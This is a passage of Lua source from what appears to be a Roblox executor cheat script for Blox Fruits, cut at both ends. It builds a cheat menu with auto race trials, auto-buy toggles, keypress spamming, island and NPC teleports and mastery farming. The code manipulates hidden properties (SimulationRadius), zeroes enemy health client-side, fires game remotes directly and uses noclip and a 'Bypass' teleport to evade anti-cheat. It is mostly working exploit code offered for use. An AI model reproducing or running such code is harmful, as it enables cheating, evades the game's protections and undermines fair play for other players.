                                                sethiddenproperty(LP, "SimulationRadius", math.huge)
                                            until not _G.AutoTrial or not v.Parent or v.Humanoid.Health <= 0
                                        end)
                                    end
                                end
                            elseif LP.Data.Race.Value == "Skypiea" then
                                for i,mV in pairs(game:GetService("Workspace").Map:GetChildren()) do
                                    if mV.Name == "SkyTrial" then
                                        for _,v in pairs(mV.Model:GetDescendants()) do
                                            if v.Name == "snowisland_Cylinder.081" then
                                                if getDistance(v.CFrame) < 5000 then
                                                    toPoint(v.CFrame)
                                                end
                                            end
                                        end
                                    end
                                end
                            elseif LP.Data.Race.Value == "Fishman" then
                                if getDistance(workspace.Map.FishmanTrial:GetPivot()) < 5000 then
                                    if #workspace.SeaBeasts:GetChildren() > 0 then
                                        local seaBeast = getNearestSeaBeast()
                                        spawn(function()
                                            repeat wait()
                                                toTarget(CFrame.new(seaBeast.HumanoidRootPart.CFrame.X, 60, seaBeast.HumanoidRootPart.CFrame.Z) * RandomOffsetCFrameSeaBeast())
                                            until not seaBeast or not seaBeast.Parent or seaBeast.Health.Value <= 0 or not _G.AutoTrial
                                            StopTween()
                                        end)
                                        repeat wait()
                                            if getDistance(CFrame.new(seaBeast.HumanoidRootPart.CFrame.X, 60, seaBeast.HumanoidRootPart.CFrame.Z)) < 100 then
                                                AvailableTools = {}
                                                if LP.Data.Stats.Melee.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Melee")
                                                end
                                                if LP.Data.Stats["Demon Fruit"].Level.Value > 500 then  
                                                    table.insert(AvailableTools, "Blox Fruit")
                                                end
                                                if LP.Data.Stats.Sword.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Sword")
                                                end
                                                if LP.Data.Stats.Gun.Level.Value > 500 then
                                                    table.insert(AvailableTools, "Gun")
                                                end
                                                for _,cTool in pairs(LP.Backpack:GetChildren()) do
                                                    canUseThis = false
                                                    if cTool.Name == "Buddha-Buddha" or cTool.Name == "Portal-Portal" or cTool.Name == "Control-Control" then
                                                        local skipFruitShit = 0
                                                    else
                                                        for _,x in AvailableTools do
                                                            if cTool.ToolTip == x then
                                                                canUseThis = true
                                                            end
                                                        end
                                                        if canUseThis then
                                                            LP.Character.Humanoid:EquipTool(cTool)
                                                            wait(.01)
                                                            AttackSkill(seaBeast, CFrame.new(seaBeast.HumanoidRootPart.CFrame.X, 20, seaBeast.HumanoidRootPart.CFrame.Z))
                                                        end
                                                    end
                                                end
                                            end
                                        until not seaBeast or not seaBeast.Parent or seaBeast.Health.Value <= 0 or not _G.AutoTrial
                                    end
                                end
                            elseif LP.Data.Race.Value == "Cyborg" then
                                if getDistance(CFrame.new(28282.5703125, 14896.8505859375, 105.1042709350586)) > 5000 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                                end
                            elseif LP.Data.Race.Value == "Ghoul" then
                                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                                        if getDistance(v.HumanoidRootPart.CFrame) < 5000 then 
                                            PosMon = LP.Character.HumanoidRootPart.CFrame * CFrame.new(20,0,-20)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        end
                                    end
                                end
                            elseif LP.Data.Race.Value == "Mink" then
                                for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                                    if v.Name == "StartPoint" and getDistance(v.CFrame) < 2000 then
                                        toPoint(v.CFrame * CFrame.new(0,10,0))
                                    end
                                end
                            end
                        end
                    end
                end)
            end)

            AutoStartTrial = RaceV4Section:NewToggle("Auto Start Trial [not working]", function(state)
                getgenv().EuphoriaSettings["Auto Start Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().EuphoriaSettings["Auto Start Trial"] then _G.AutoStartTrial = true else _G.AutoStartTrial = false end
                    end
                end)
            end)
            if getgenv().EuphoriaSettings["Auto Start Trial"] then AutoStartTrial:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
                        if _G.AutoStartTrial and _G.AutoTrial and not LP.PlayerGui.Main.Timer.Visible and not _G.GoingTrial then
                            phase = game:GetService("Lighting"):GetAttribute("MoonPhase")
                            if phase == 5 and IsNight() then
                                if LP.Data.Race.Value == "Fishman" then
                                    pos = CFrame.new(28224.056640625, 14889.4267578125, -210.5872039794922)
                                elseif LP.Data.Race.Value == "Human" then
                                    pos = CFrame.new(29237.294921875, 14889.4267578125, -206.94955444335938)
                                elseif LP.Data.Race.Value == "Cyborg" then
                                    pos = CFrame.new(28492.4140625, 14894.4267578125, -422.1100158691406)
                                elseif LP.Data.Race.Value == "Skypiea" then
                                    pos = CFrame.new(28967.408203125, 14918.0751953125, 234.31198120117188)
                                elseif LP.Data.Race.Value == "Ghoul" then
                                    pos = CFrame.new(28672.720703125, 14889.1279296875, 454.5961608886719)
                                elseif LP.Data.Race.Value == "Mink" then
                                    pos = CFrame.new(29020.66015625, 14889.4267578125, -379.2682800292969)
                                end
                                if getDistance(pos) > 100 and getDistance(pos) < 5000 then
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "W", false, game)
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "W", false, game)
                                    wait(4)
                                    game:service('VirtualInputManager'):SendKeyEvent(true, "S", false, game)
                                    game:service('VirtualInputManager'):SendKeyEvent(false, "S", false, game)
                                end
                            end
                        end
                    end
                end)
            end)

            SuicideTrial = RaceV4Section:NewToggle("Suicide After Complete Trial [not working]", function(state)
                getgenv().EuphoriaSettings["Suicide After Complete Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().EuphoriaSettings["Suicide After Complete Trial"] then _G.SuicideAfterTrial = true else _G.SuicideAfterTrial = false end
                    end
                end)
            end)
            if getgenv().EuphoriaSettings["Suicide After Complete Trial"] then SuicideTrial:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
                        if _G.GoingTrial and _G.SuicideAfterTrial and not not LP.PlayerGui.Main.Timer.Visible then
                            repeat wait(1) until LP.PlayerGui.Main.Timer.Visible
                            _G.GoingTrial = false
                            LP.Humanoid.Health = 0
                        end
                    end
                end)
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if _G.AutoTrial and LP.PlayerGui.Main.Timer.Visible == true and not _G.GoingTrial then
                            _G.GoingTrial = true
                        end
                    end
                end)
            end)

            v4Status = RaceV4Section:NewLabel("V4 Status: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        v4Status:UpdateLabel("V4 Status: " .. CheckAncientOneStatus())
                    end)
                end
            end)
            RaceV4Section:NewButton("Buy Ancient One Quest", function()
                ReplicatedStorage.Remotes.CommF_:InvokeServer('UpgradeRace','Buy')
            end)
            AncientOne = RaceV4Section:NewToggle("Auto Buy", function(state)
                getgenv().EuphoriaSettings["Auto Buy Ancient One Quest"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Buy Ancient One Quest"] then AncientOne:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait(5) do
                        if getgenv().EuphoriaSettings["Auto Buy Ancient One Quest"] then 
                            ReplicatedStorage.Remotes.CommF_:InvokeServer('UpgradeRace','Buy')
                        end
                    end
                end)
            end)
            SpamAWK = RaceV4Section:NewToggle("Spam Awakening Skill", function(state)
                getgenv().EuphoriaSettings["Spam AWK"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Spam AWK"] then SpamAWK:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().EuphoriaSettings["Spam AWK"] then 
                            game:service('VirtualInputManager'):SendKeyEvent(true, "Y", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "Y", false, game)
                        end
                    end
                end)
            end)
            
            gearsTitle = RaceV4Section:NewLabel("Gears 0/3 (Complete trial to see)")
            spawn(function()
                while wait() do
                    pcall(function()
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check") then
                            gearsTitle:UpdateLabel("Gears " .. #game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check").RaceDetails.Gears ..  "/3")
                        end
                    end)
                    wait(10)
                end
            end)
            Gear1 = RaceV4Section:NewLabel("Gear 1: None")
            Gear2 = RaceV4Section:NewLabel("Gear 2: None")
            Gear3 = RaceV4Section:NewLabel("Gear 3: None")
            spawn(function()
                while wait() do
                    pcall(function()
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check") then
                            gears = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check").RaceDetails.Gears
                            if #gears >= 1 then
                                if gears[1] == "A" then
                                    Gear1:UpdateLabel("Gear 1: Red")
                                else
                                    Gear1:UpdateLabel("Gear 1: Blue")
                                end
                            end
                            if #gears >= 2 then
                                if gears[2] == "A" then
                                    Gear2:UpdateLabel("Gear 2: Red")
                                else
                                    Gear2:UpdateLabel("Gear 2: Blue")
                                end
                            end
                            if #gears >= 3 then
                                if gears[3] == "A" then
                                    Gear3:UpdateLabel("Gear 3: Red")
                                else
                                    Gear3:UpdateLabel("Gear 3: Blue")
                                end
                            end
                        end
                    end)
                    wait(5)
                end
            end)
            RaceV4Section:NewLabel(" ")
            BlueGearDetails = RaceV4Section:NewLabel("Blue Gear: ")
            RedGearDetails = RaceV4Section:NewLabel("Red Gear: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        repeat wait() until PlayerData.Race
                        if PlayerData.Race == "Fishman" then
                            BlueGearDetails:UpdateLabel("Blue Gear: Whirlpool")
                            RedGearDetails:UpdateLabel("Red Gear: Leviathan Armor")
                        end
                        if PlayerData.Race == "Cyborg" then
                            BlueGearDetails:UpdateLabel("Blue Gear: Aftershock")
                            RedGearDetails:UpdateLabel("Red Gear: Energy Control (Drones)")
                        end
                        if PlayerData.Race == "Skypiea" then
                            BlueGearDetails:UpdateLabel("Blue Gear: King`s rule")
                            RedGearDetails:UpdateLabel("Red Gear: Prince of the skies")
                        end
                        if PlayerData.Race == "Human" then
                            BlueGearDetails:UpdateLabel("Blue Gear: Rage Meter [ V2 100% ]")
                            RedGearDetails:UpdateLabel("Red Gear: Flash Steps [ Shit ]")
                        end
                        if PlayerData.Race == "Mink" then
                            BlueGearDetails:UpdateLabel("Blue Gear: Whirlwind [ V2 100% ]")
                            RedGearDetails:UpdateLabel("Red Gear: Lightning Cloak")
                        end
                        if PlayerData.Race == "Ghoul" then
                            BlueGearDetails:UpdateLabel("Blue Gear: Domain Expansion [ V2 100% ]")
                            RedGearDetails:UpdateLabel("Red Gear: Blood Siphon [ Shit ]")
                        end
                    end)
                    wait(100)
                end
            end)
            RaceV4Section:NewButton("Teleport to Clock", function()
                toPoint(CFrame.new(29556.0352, 15068.6846, -87.2691345, -0.00013444366, 1.03250407e-07, -1, 6.57894361e-08, 1, 1.03241561e-07, 1, -6.57755592e-08, -0.00013444366))
            end)
            RaceV4Section:NewButton("Buy Blue Gear", function()
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check") then
                    local args = {
                        [1] = "TempleClock",
                        [2] = "SpendPoint",
                        [3] = "Gear" .. tostring(2 + #game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check").RaceDetails.Gears),
                        [4] = "Omega"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    notis.new("<Color=Green>Blue Gear placed successfully<Color=/>"):Display()
                else
                    notis.new("<Color=Red>Complete trial before<Color=/>"):Display()
                    return
                end
            end)
            RaceV4Section:NewButton("Buy Red Gear", function()
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check") then
                    local args = {
                        [1] = "TempleClock",
                        [2] = "SpendPoint",
                        [3] = "Gear" .. tostring(2 + #game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TempleClock","Check").RaceDetails.Gears),
                        [4] = "Alpha"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    notis.new("<Color=Green>Red Gear placed successfully<Color=/>"):Display()
                else
                    notis.new("<Color=Red>Complete trial before<Color=/>"):Display()
                    return
                end
            end)
        end

        


        local TeleportTab = Window:NewTab("Teleport")
        local TeleportToSeaSection = TeleportTab:NewSection("Teleport to sea")
        local ServerTab = Window:NewTab("Server")
        local ServerSection = ServerTab:NewSection("Server")
        TeleportToSeaSection:NewButton("Teleport to first sea", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
        end)
        TeleportToSeaSection:NewButton("Teleport to second sea", function()
            teleportToSecondSea()
        end)
        TeleportToSeaSection:NewButton("Teleport to third sea", function()
            teleportToThirdSea()
        end)
        
        if second_sea then
            IslandPos = {
                ["Cafe"] = CFrame.new(-381.679047, 77.2203598, 260.130615, 0.998160779, 7.18165349e-09, -0.0606226437, -6.2934169e-09, 1, 1.48428274e-08, 0.0606226437, -1.44340042e-08, 0.998160779),
                ["Arowe place"] = CFrame.new(-2020.3894, 125.492752, -75.1585541, -0.186118439, -2.31245778e-08, -0.982527316, 1.71813463e-09, 1, -2.38612738e-08, 0.982527316, -6.1291372e-09, -0.186118439),
                ["Green Zone"] = CFrame.new(-2527.41235, 72.9661179, -3286.44238, 0.726720333, 2.1428963e-09, 0.686933458, -2.89159297e-09, 1, -6.04382031e-11, -0.686933458, -1.94241023e-09, 0.726720333),
                ["Hot and Cold"] = CFrame.new(-5772.93457, 20.2020435, -4955.99072, -0.190426946, 8.08608824e-09, 0.981701374, -3.21236437e-09, 1, -8.85993323e-09, -0.981701374, -4.84075269e-09, -0.190426946),
                ["Colosseum"] = CFrame.new(-1834.76782, 45.7947006, 1499.06641, -0.999703407, 6.79347281e-08, -0.0243541766, 6.99724936e-08, 1, -8.28199305e-08, 0.0243541766, -8.44994901e-08, -0.999703407),
                ["Cursed Ship"] = CFrame.new(923.941711, 125.057106, 32945.1016, -0.999903142, -6.41719495e-08, -0.0139173511, -6.55000747e-08, 1, 9.49734584e-08, 0.0139173511, 9.58758477e-08, -0.999903142),
                ["Zombie Island"] = CFrame.new(-5508.83838, 48.4801178, -921.756409, 0.645064175, 5.74061954e-09, -0.764128387, 7.40661577e-08, 1, 7.00380269e-08, 0.764128387, -1.01775072e-07, 0.645064175),
                ["Snow Mountain"] = CFrame.new(984.71875, 429.421875, -5224.56689, 0.410833359, -3.39381678e-08, 0.911710441, 2.1759778e-08, 1, 2.74193699e-08, -0.911710441, 8.57382432e-09, 0.410833359),
                ["Ice Castle"] = CFrame.new(6092.85791, 294.386688, -6687.76562, 0.552581847, -5.16517717e-09, -0.833458662, 1.64160396e-09, 1, -5.10889953e-09, 0.833458662, 1.45487611e-09, 0.552581847),
                ["Forgotten Island"] = CFrame.new(-3155.89551, 298.66449, -10544.9893, -0.998934627, 2.08474251e-08, -0.0461482927, 1.69908887e-08, 1, 8.39606216e-08, 0.0461482927, 8.30870661e-08, -0.998934627),
                ["Darkbeard Arena"] = CFrame.new(3738.17676, 100.6501837, -3449.45483, 0.807372749, 2.30504718e-08, -0.590041697, 9.58726787e-09, 1, 5.21843972e-08, 0.590041697, -4.77891504e-08, 0.807372749),
                ["Law Laboratory"] = CFrame.new(-5531.46436, 328.953278, -5939.38232, 0.99832046, 3.13601456e-09, 0.0579328425, -5.91816951e-09, 1, 4.78522182e-08, -0.0579328425, -4.81147033e-08, 0.99832046),
                ["Raid Room"] = CFrame.new(-6505.47021, 249.531616, -4480.81445, 0.190456197, -5.0886233e-09, -0.981695712, 2.66903371e-08, 1, -5.38176101e-12, 0.981695712, -2.62007642e-08, 0.190456197),
                ["Swan room"] = CFrame.new(2287.2063, 15.1520348, 837.542542, 0.997465432, 3.42148105e-08, -0.0711523443, -3.17858344e-08, 1, 3.52698919e-08, 0.0711523443, -3.29188623e-08, 0.997465432),
                ["Mansion"] = CFrame.new(-389.768494, 331.860565, 685.700256, 0.992786944, -4.46675372e-08, -0.119891919, 4.67511327e-08, 1, 1.45662709e-08, 0.119891919, -2.00662864e-08, 0.992786944),
                ["Start position"] = CFrame.new(-20.1357784, 19.2767277, 2828.39429, 0.998764515, 0, -0.0496935807, 0, 1, 0, 0.0496935807, 0, 0.998764515),
            }
            NPCPos = {
                ["Sea Captain"] = CFrame.new(91.8420105, 19.2767277, 2833.7854, 0.0328539163, 8.44573549e-08, -0.999460161, 4.0394589e-08, 1, 8.58308127e-08, 0.999460161, -4.31926601e-08, 0.0328539163),
                ["King Red Head"] = CFrame.new(-1927.43982, 12.8198519, 1738.24329, -0.975165844, -1.66522227e-08, 0.22147578, -3.06991677e-09, 1, 6.16705975e-08, -0.22147578, 5.94591505e-08, -0.975165844),
                ["Arowe"] = CFrame.new(-2020.3894, 125.492752, -75.1585541, -0.186118439, -2.31245778e-08, -0.982527316, 1.71813463e-09, 1, -2.38612738e-08, 0.982527316, -6.1291372e-09, -0.186118439),
                ["Trevor"] = CFrame.new(-336.726624, 331.860565, 646.967407, 0.304350466, 5.17507992e-08, -0.952560127, -5.24115045e-08, 1, 3.75822289e-08, 0.952560127, 3.84869381e-08, 0.304350466),
                ["Alchemist"] = CFrame.new(-2779.698, 72.9661179, -3574.21094, -0.738383949, -3.42040423e-08, -0.674380541, -2.87388247e-08, 1, -1.92528642e-08, 0.674380541, 5.1648974e-09, -0.738383949),
                ["Bartilo"] = CFrame.new(-459.294189, 73.0200729, 300.489349, 0.311311901, -8.80943176e-08, 0.950307786, 7.91016816e-08, 1, 6.67878552e-08, -0.950307786, 5.43790897e-08, 0.311311901),
                ["True Triple Katana Guy"] = CFrame.new(-2570.1438, 1623.62756, -3742.23755, 0.338274449, 6.07209785e-08, 0.94104749, 5.74162584e-08, 1, -8.51640607e-08, -0.94104749, 8.2840252e-08, 0.338274449),
                ["Law Chip Guy"] = CFrame.new(-4971.53271, 143.731888, -5390.03809, 0.529998064, -8.96415173e-08, 0.847998857, 4.93730319e-08, 1, 7.48514069e-08, -0.847998857, 2.19717267e-09, 0.529998064),
                ["Mysterious Scientist"] = CFrame.new(-6434.44141, 250.619507, -4500.30078, 0.74296844, 1.60236375e-08, -0.669326484, -9.17431109e-09, 1, 1.37562379e-08, 0.669326484, -4.07984135e-09, 0.74296844),
                ["El Rodolfo"] = CFrame.new(941.813538, 40.4428635, 32776.4297, -0.990710258, -3.78767453e-08, 0.135989532, -2.74683352e-08, 1, 7.84147218e-08, -0.135989532, 7.3950865e-08, -0.990710258),
                ["El Perro"] = CFrame.new(633.295593, 130.597015, 33220.1289, -0.999032795, 6.67597249e-08, 0.0439718179, 6.54874057e-08, 1, -3.03754852e-08, -0.0439718179, -2.74665055e-08, -0.999032795),
                ["El Admin"] = CFrame.new(1322.41309, 125.43914, 33136.4375, 0.714200675, 5.21663546e-10, -0.699940979, -1.14109902e-10, 1, 6.28861851e-10, 0.699940979, -3.6926337e-10, 0.714200675),
                ["Experimic"] = CFrame.new(916.359558, 129.555984, 33450.1914, -0.989536464, -4.57067495e-09, 0.144282907, -4.12639656e-09, 1, 3.37846595e-09, -0.144282907, 2.7477467e-09, -0.989536464),
                ["Blox Fruit Gacha"] = CFrame.new(-422.505066, 72.9597549, 388.921509, 0.999904692, -3.36936061e-08, -0.0138063869, 3.36184627e-08, 1, -5.67464209e-09, 0.0138063869, 5.20995158e-09, 0.999904692),
                ["Blox Fruit Dealer"] = CFrame.new(-449.981079, 73.0200729, 357.801483, -0.0330029204, 6.85504844e-08, 0.999455273, 1.72488139e-08, 1, -6.80182737e-08, -0.999455273, 1.49946153e-08, -0.0330029204),
                ["Title/Color Specialist"] = CFrame.new(-350.412598, 16.0200996, 307.551544, -0.0483315699, 4.33923759e-08, -0.998831332, 4.44134294e-08, 1, 4.12940615e-08, 0.998831332, -4.23657163e-08, -0.0483315699),
                ["Plokster"] = CFrame.new(-1889.18433, 88.3578491, -1905.7063, 0.831714571, -6.32608348e-08, 0.555203438, 8.577247e-08, 1, -1.45485135e-08, -0.555203438, 5.97213798e-08, 0.831714571),
            }
            IslandNames = {
                "Cafe",
                "Arowe place",
                "Green Zone",
                "Hot and Cold",
                "Colosseum",
                "Cursed Ship",
                "Zombie Island",
                "Snow Mountain",
                "Ice Castle",
                "Forgotten Island",
                "Darkbeard Arena",
                "Law Laboratory",
                "Raid Room",
                "Swan room",
                "Mansion",
                "Start position"
            }
            NPCNames = {
                "Sea Captain",
                "King Red Head",
                "Arowe",
                "Trevor",
                "Alchemist",
                "Bartilo",
                "True Triple Katana Guy",
                "Law Chip Guy",
                "Mysterious Scientist",
                "El Rodolfo",
                "El Perro",
                "El Admin",
                "Experimic",
                "Blox Fruit Gacha",
                "Blox Fruit Dealer",
                "Title/Color Specialist",
                "Plokster"
            }
        end
        if third_sea then
            IslandPos = {
                ["Mansion"] = CFrame.new(-12550.6885, 337.168274, -7513.34277, 0.999895096, 0, 0.01448303, 0, 1, 0, -0.01448303, 0, 0.999895096),
                ["Hydra Island"] = CFrame.new(5256.84521, 601.603638, 616.78363, -0.999633908, -6.08200734e-09, -0.0270565897, -6.38501385e-09, 1, 1.11126006e-08, 0.0270565897, 1.12812888e-08, -0.999633908),
                ["Port Town"] = CFrame.new(-303.432922, 6.72993994, 5312.11426, 0.950251818, 0, -0.311482787, 0, 1, 0, 0.311482787, 0, 0.950251818),
                ["Haunted Castle"] = CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981),
                ["Castle on the Sea"] = CFrame.new(-5087.12158, 314.515503, -2978.61523, -0.40476504, 3.7508137e-08, 0.914420724, 1.00039621e-08, 1, -3.65902508e-08, -0.914420724, -5.66262415e-09, -0.40476504),
                ["Floating Turtle"] = CFrame.new(-10842.5586, 331.723206, -9248.37598, -0.184897989, 0, 0.982757747, 0, 1, 0, -0.982757747, 0, -0.184897989),
                ["Ice Cream Island"] = CFrame.new(-621.127686, 126.871155, -11040.8545, -0.503357649, -4.11361825e-08, -0.864078164, -2.85817112e-08, 1, -3.09571071e-08, 0.864078164, 9.11433595e-09, -0.503357649),
                ["Peanut Island"] = CFrame.new(-2181.91528, 88.2388306, -10513.2871, 0.115819328, 2.167112e-08, -0.993270278, 7.09502004e-08, 1, 3.00910266e-08, 0.993270278, -7.39578496e-08, 0.115819328),
                ["Cake Island"] = CFrame.new(-2131.6665, 69.9830399, -12273.0225, -0.977835476, -6.95206595e-08, -0.209374622, -5.05051609e-08, 1, -9.616695e-08, 0.209374622, -8.34609537e-08, -0.977835476),
                ["Chocolate Island"] = CFrame.new(247.748123, 38.5827065, -12774.5391, -0.846695721, -1.00770627e-07, 0.532077372, -6.36673008e-08, 1, 8.80770372e-08, -0.532077372, 4.06985201e-08, -0.846695721),
                ["Great Tree"] = CFrame.new(2940.33911, 2280.61816, -7197.37891, 0.871008873, 8.15059948e-08, -0.491267264, -6.67008138e-08, 1, 4.7650218e-08, 0.491267264, -8.73583428e-09, 0.871008873),
            }
            NPCPos = {
                ["Uzoth"] = CFrame.new(-9784.63281, 851.815735, 6668.09277, -0.0881351829, -1.32053213e-08, -0.996108532, 5.9710402e-08, 1, -1.85400566e-08, 0.996108532, -6.11120683e-08, -0.0881351829),
                ["Previous Hero"] = CFrame.new(-10368, 332, -10128),
                ["Sea 2 Fighting Styles"] = CFrame.new(-5035.29492, 314.515503, -3189.82471, 0.924805701, 0, 0.380439758, 0, 1, 0, -0.380439758, 0, 0.924805701),
                ["Mysterious Scientist"] = CFrame.new(-5016.1416, 314.818207, -2823.27783, -0.932020426, 0, -0.362405717, 0, 1, 0, 0.362405717, 0, -0.932020426),
                ["Butler"] = CFrame.new(-5129.07715, 315.415466, -3125.02295, 0.485516787, 0, -0.874227345, 0, 1, 0, 0.874227345, 0, 0.485516787),
                ["Elite Hunter"] = CFrame.new(-5431.4668, 313.768921, -2829.01245, -0.926955104, -1.04650994e-07, -0.375172317, -1.06914023e-07, 1, -1.47838799e-08, 0.375172317, 2.64071875e-08, -0.926955104),
                ["Player Hunter"] = CFrame.new(-5554.97119, 313.768921, -2839.86304, -0.74428612, -3.15137747e-08, 0.667860866, -4.87426739e-08, 1, -7.13430337e-09, -0.667860866, -3.78632876e-08, -0.74428612),
                ["Blox Fruit Gacha"] = CFrame.new(-12505.0684, 336.914368, -7454.92725, -0.903258443, -1.02848034e-07, -0.429096937, -1.10697549e-07, 1, -6.66409239e-09, 0.429096937, 4.14805825e-08, -0.903258443),
            }
            IslandNames = {
                "Mansion",
                "Hydra Island",
                "Port Town",
                "Haunted Castle",
                "Castle on the Sea",
                "Floating Turtle",
                "Ice Cream Island",
                "Peanut Island",
                "Cake Island",
                "Chocolate Island",
                "Great Tree"
            }
            NPCNames = {
                "Uzoth",
                "Previous Hero",
                "Sea 2 Fighting Styles",
                "Mysterious Scientist",
                "Butler",
                "Elite Hunter",
                "Player Hunter",
                "Blox Fruit Gacha"
            }
        end
        _G.SelectedIslandPos = nil
        _G.SelectedNPCPos = nil
        _G.TweenToIsland = false
        _G.TweenToNPC = false
        local TeleportToIslandSection = TeleportTab:NewSection("Teleport to island")
        TeleportToIslandSection:NewDropdown("Select island", IslandNames or {}, function(currentOption)
            _G.SelectedIslandPos = IslandPos[currentOption] or nil
        end)
        
        TeleportToIslandSection:NewToggle("Tween to island", function(state)
            _G.TweenToIsland = state
            if not state then 
                NoClip = false 
                StopTween()
            end

        end)
        local TeleportToNPCSection = TeleportTab:NewSection("Teleport to NPC")
        TeleportToNPCSection:NewDropdown("Select NPC", NPCNames or {}, function(currentOption)
            _G.SelectedNPCPos = NPCPos[currentOption] or nil
        end)
        TeleportToNPCSection:NewToggle("Tween to NPC", function(state)
            _G.TweenToNPC = state
            if not state then
                NoClip = false 
                StopTween()
            end
        end)
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.TweenToIsland then
                        if not _G.SelectedIslandPos then 
                            NoClip = false
                        else
                            if getDistance(_G.SelectedIslandPos) > 500 then
                                NoClip = true
                            else
                                NoClip = false
                            end
                        end
                        if _G.SelectedIslandPos then
                            if _G.UseBypassTP then
                                if getDistance(_G.SelectedIslandPos) > 5000 then
                                    Bypass(_G.SelectedIslandPos)
                                end
                            end
                            if getDistance(_G.SelectedIslandPos) > 2000 then
                                useNearestEntrance(_G.SelectedIslandPos)
                                wait(1)
                            end
                            toPoint(_G.SelectedIslandPos)
                        end
                    end
                end)
            end
        end)
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.TweenToNPC then
                        if not _G.SelectedNPCPos then 
                            NoClip = false
                        else
                            if getDistance(_G.SelectedNPCPos) > 500 then
                                NoClip = true
                            else
                                NoClip = false
                            end
                        end
                        if _G.SelectedNPCPos then
                            if _G.UseBypassTP then
                                if getDistance(_G.SelectedNPCPos) > 5000 then
                                    Bypass(_G.SelectedNPCPos)
                                end
                            end
                            toPoint(_G.SelectedNPCPos)
                        end
                    end
                end)
            end
        end)

        TeleportToNPCSection:NewButton("Stop Tween", function()
            StopTween()
        end)

        local MasterySection = MainTab:NewSection("Mastery")
        _G.KillAtPercent = 25
        SmartPercentKill = MasterySection:NewToggle("Smart Kill At %", function(state)
            getgenv().EuphoriaSettings['Smart Kill At %'] = state
        end)
        if getgenv().EuphoriaSettings['Smart Kill At %'] then SmartPercentKill:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['Smart Kill At %'] then
                        _G.SmartPercentKill = true
                    else
                        _G.SmartPercentKill = false
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if _G.SmartPercentKill and FarmMasteryTarget then
                        if _G.SelectWeapon == "Melee" then
                            Damage = LP.Data.Stats.Melee.Value * 1.3
                            _G.KillAtPercent = math.floor((Damage * 100) / FarmMasteryTarget.Humanoid.MaxHealth)
                        end
                        if _G.SelectWeapon == "Sword" then
                            Damage = LP.Data.Stats.Sword.Value * 1.3
                            _G.KillAtPercent = math.floor((Damage * 100) / FarmMasteryTarget.Humanoid.MaxHealth)
                        end
                    end
                end)
            end
        end)

        FarmWeaponMastery = MasterySection:NewToggle("Auto Farm Mastery Selected Weapon [Best Way]", function(state)
            getgenv().EuphoriaSettings['Farm Mastery Best Way Selected Weapon'] = state
        end)
        if getgenv().EuphoriaSettings['Farm Mastery Best Way Selected Weapon'] then FarmWeaponMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['Farm Mastery Best Way Selected Weapon'] then
                        _G.FarmWeaponMastery = true
                    else
                        if not _G.AutoTTKMastery then
                            _G.FarmWeaponMastery = false
                        end
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if _G.FarmWeaponMastery then
                        local plrLevel = LP.Data.Level.Value
                        local mobList = {}
                        if plrLevel >= 1500 and third_sea then
                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                        elseif plrLevel >= 700 and second_sea then
                            mobList = {"Water Fighter", "Sea Soldier"}
                        end
                        local farmMasTarget = getClosest(mobList)
                        if farmMasTarget then
                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                repeat task.wait()
